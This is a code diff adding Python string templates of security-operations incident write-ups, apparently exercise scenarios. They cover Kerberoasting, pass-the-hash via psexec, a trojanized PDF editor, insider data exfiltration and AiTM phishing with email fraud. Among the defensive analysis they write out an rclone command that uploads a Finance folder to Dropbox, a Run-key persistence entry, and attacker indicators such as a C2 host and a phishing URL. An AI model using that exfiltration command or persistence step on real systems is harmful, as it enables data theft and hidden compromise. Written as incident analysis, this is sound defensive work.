@@ -1,0 +1,131 @@
+
+# Kerberoasting -> DataHaven
+initial_analysis_kerberoast = f"""
+We observe activity indicating Kerberoasting from the user kristin.hansen on the host WS-072. The user has requested three service-tickets from three service accounts (svc_sql, svc_exchange and svc_web).
+Kerberoasting is a type of post-exploitation attack technique targeting the Kerberos authentication protocol, enabling adversaries to extract encrypted service account credentials from Active Directory [1].
+About 20 minuets later, one of those service accounts (svc_sql) successfully authenticated to sql01.datahaven.local from kristin.hansen's workstation.
+
+Our hypothesis is that a threat actor is in control of the users account, and has used it to kerberoast the 3 service accounts, cracked the password hash of svc_sql and now successfully authenticated to the SQL server sql01.datahaven.local
+
+[1] https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/kerberoasting/
+"""
+
+# PTH - Silverline
+initial_analysis_pth = f"""
+We observe that the user ola.hansen used pass-the-hash to authenticate as svc_deploy to SRV-APPS01 using psexec from WKSTN-23. Using Psexec, the user made SRV-APPS01 run a powershell cradle which established a TCP connection to odd-lilac-weasel.zone:4444.
+Following this, the same process attempts to dump the SAM and SYSTEM hive on the SRV-APPS01. EDR appears to have stopped the dumping of the SAM and SYSTEM and terminated the TCP connection to odd-lilac-weasel.zone:4444. However, the user ola.hansen is still in the network.
+
+Our hypothesis is that the user is compromised and a threat actor has a foothold inside the network. The threat actor also seem to have access to the service account svc_deploy.
+"""
+
+# Malware -> customer = silverline - Ferdig
+initial_analysis_malware_long = f"""
+Microsoft Defender AV detected TamperedChef/PDFEditor on the host WIN10-SL-312. We observe that the user karin.larsen@silverline.no (Operations) has downloaded and installed a trojanized PDF editor on the host WIN10-SL-312.
+The activity originally seems to stem from a Google Ad (malvertising) for a fraudulent PDF editor. The user downloads a file called AppSuite-PDF-1.0.28.msi from vault.appsuites[.]ai. The installer unpacks to Program Files\\AppSuite PDF Editor\\ and spawns PDFEditor.exe.
+
+Shortly after installation, we observe that the program does several suspicious things, including creating several related files (pdfeditor.js and UtilityAddon.node).
+Additionally, a registry key is added, which will launch when the computer restarts:
+
+```
+HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -> "%USERPROFILE%\\PDF Editor\\PDF Editor.exe --cm=--fullupdate"
+```
+When the argument –fullupdate is set the executable loads an obfuscated file that is downloaded into /resources/app/w-electron/bun/releases/pdfeditor.js. [1]
+Following this, we observe activity indicating credential dumping activity from the browser credential stores, and network logs that shows outbound TLS connections to product.update.appsuites[.]ai and appsuites[.]ai API endpoints.
+
+Our current hypothesis is that this activity represents a confirmed host compromise caused by a trojanized installer, resulting in persistence, credential theft, and potential command-and-control communication with external attacker infrastructure.
+
+[1] https://www.truesec.com/hub/blog/tamperedchef-the-bad-pdf-editor
+[2] https://www.gdatasoftware.com/blog/2025/08/38257-appsuite-pdf-editor-backdoor-analysis
+"""
+
+# Malware -> Customer = Silverline - Ferdig
+initial_analysis_malware_short = f"""
+We observe that the user karin.larsen@silverline.no has downloaded and executed a trojanized PDF editor from vault.appsuites[.]ai on the host WIN10-SL-312.
+After the installation, we observe suspicious underlying activity by this file; for instance that it creates pdfeditor.js, and adds a registry key, which indicates persistence creation of the file.
+We also observe that the program is used to dump credentials from the browser, and outbound traffic to product.update.appsuites[.]ai.
+
+Hypothesis: Host is compromised by trojanized installer, and browser credentials has been dumped and potentially exfiltrated.
+"""
+
+# Exfil -> Customer = Datahaven - Ferdig
+initial_analysis_exfil_long = f"""
+We observe that the user lars.haugen@datahaven.no (Finance) has attempted to exfiltrate potentially sensitive data from your organization from the host WIN10-DH-113.
+We first observe that the user attempts to exfiltrate data over email, where he tries to send the following files to lars.personal@gmail.com:
+- Client_Contracts_Archive.zip
+- Q3_Financials.xlsx
+- Client_Contracts_Archive_pwd.zip
+However, due to DLP policies, the emails were blocked from sending. This was both due to the size of the files, as well as they contained sensitive PII.
+Following these blocked attempts, we observe that the user utilizes rclone.exe through the following commandline, to upload the Finance folder to Dropbox, which is an unsanctioned cloud app for your organization:
+```
+rclone copy C:\\Users\\Lars\\Documents\\Finance\\ dropbox:/Finance_Backup --transfers 4
+```
+Rclone is a command-line program to manage files on cloud storage [1].
+
+Underlying events indicate that a transfer of ~1.1 GB was send to Dropbox, which has been flagged as anomaly.
+Our hypothesis is that this activity represents either an intentional attempt to bypass DLP and exfiltrate financial data by a negligent user, or it could indicate that the user account is compromised account.
+
+[1] https://rclone.org/
+
+"""
+
+# Exfil -> Customer = Datahaven - Ferdig
+initial_analysis_exfil_short = f"""
+We observe that the user lars.haugen@datahaven.no has attempted to exfiltrate sensitive data from your organization from the host WIN10-DH-113. First, the user tries to exfiltrate three items over email, which gets blocked by DLP policies.
+The user then use rclone to copy the Finance folder over to Dropbox (~1.1 GB).
+Hypothesis: User is intentionally trying to exfiltrate sensitive organizational data. Could also be compromised user.
+"""
+
+# AiTM -> Customer = DataHaven - Ferdig
+initial_analysis_aitm_short = f"""
+We observe that the user erik.nilsen@datahaven.no received anc clicked a phishing email related to Tycoon 2FA: hXXps://i9152[.]cisele0[.]com/NOZcbtTxxEiGj/
+It appears that the user has submitted their credentials and authenticated on the site. After this we see a new login from an unfamiliar IP (89.185.80.19) and location (Arizona, US) with a new UA (Axios/1.7.9).
+This suggests credential replay through AiTM phishing framework.
+Following this, we see a new email forwarding rule to attacker-relay@outlook.com, and an outbound BEC email to finance@victimcorp.no.
+Hypothesis: User is compromised and is being used for BEC.
+"""
+
+# AiTM -> Customer = DataHaven - Ferdig
+initial_analysis_aitm_long = f"""
+We observe that the user erik.nilsen@datahaven.no received a phishing email that appears to be related to a Tycoon AiTM phishing campaign.
+In underlying logs, we see that the user has clicked an the following URL:
+```
+hXXps://i9152[.]cisele0[.]com/NOZcbtTxxEiGj/
+```
+This domain has previously been observed in Tycoon 2FA phishing campaigns [1], and has been flagged as malicious, and phishing related in VirusTotal [2].
+Based on the underlying activity, the user has submitted credentials and authenticated on the phishing portal/credential-harvesting page.
+Shortly after this activity, we observe a new successful login from a new external IP address (89.185.80.19). According to Nodedata [3] this IP has been flagged as a VPN, and that it belongs to Global Connectivity Solutions Llp (Arizona, United States).
+This new login activity also stems from a non-browser user agent Axios/1.7.9, which is consistent with scripted access and observed for Tycoon 2FA [4].
+This strongly suggests credential replay through an Adversary-in-the-Middle (AiTM) phishing framework.
+
+After the login from this new IP address, we observe that the user accesses the mail, and looks at items that matches "Invoice".
+Following this, we observe that a draft of an email called 'Re: Invoice Payment - Urgent' which will be sent to finance@victimcorp.no is created. The emails contains new payment instructions, and and attached PDF.
+Additionally, a new inbox rule was created forwarding finance related emails to attacker-relay@outlook.com. We then observe an outbound email to finance@victimcorp.no, which indicates that the source user is being used for BEC.
+
+Current hypothesis is that the user's credentials were harvested via AiTM phishing, and was reused to gain unauthorized access to the user. The victim user is then used for further exploration through business email compromise (BEC) activity.
+
+[1] https://blog.sekoia.io/tycoon-2fa-an-in-depth-analysis-of-the-latest-version-of-the-aitm-phishing-kit/
+[2] https://www.virustotal.com/gui/url/98091b7049b83815aac473ef967cf8b637b2c659a83c51bbe16305a2c7c61be5
+[3] https://nodedata.io/vpn-detection-test
+[4] https://www.esentire.com/blog/phish-chips-serving-up-tycoon-2fas-secrets
+"""
+###############################################
+# Copy + paste the initial analysis in here:
+##############################################
+
+initial_analysis = f"""
+Microsoft Defender AV detected TamperedChef/PDFEditor on the host WIN10-SL-312. We observe that the user karin.larsen@silverline.no (Operations) has downloaded and installed a trojanized PDF editor on the host WIN10-SL-312.
+The activity originally seems to stem from a Google Ad (malvertising) for a fraudulent PDF editor. The user downloads a file called AppSuite-PDF-1.0.28.msi from vault.appsuites[.]ai. The installer unpacks to Program Files\\AppSuite PDF Editor\\ and spawns PDFEditor.exe.
+
+Shortly after installation, we observe that the program does several suspicious things, including creating several related files (pdfeditor.js and UtilityAddon.node).
+Additionally, a registry key is added, which will launch when the computer restarts:
+```
+HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -> "%USERPROFILE%\\PDF Editor\\PDF Editor.exe --cm=--fullupdate"
+```
+When the argument –fullupdate is set the executable loads an obfuscated file that is downloaded into /resources/app/w-electron/bun/releases/pdfeditor.js. [1]
+Following this, we observe activity indicating credential dumping activity from the browser credential stores, and network logs that shows outbound TLS connections to product.update.appsuites[.]ai and appsuites[.]ai API endpoints.
+
+Our current hypothesis is that this activity represents a confirmed host compromise caused by a trojanized installer, resulting in persistence, credential theft, and potential command-and-control communication with external attacker infrastructure.
+
+[1] https://www.truesec.com/hub/blog/tamperedchef-the-bad-pdf-editor
+[2] https://www.gdatasoftware.com/blog/2025/08/38257-appsuite-pdf-editor-backdoor-analysis
+"""
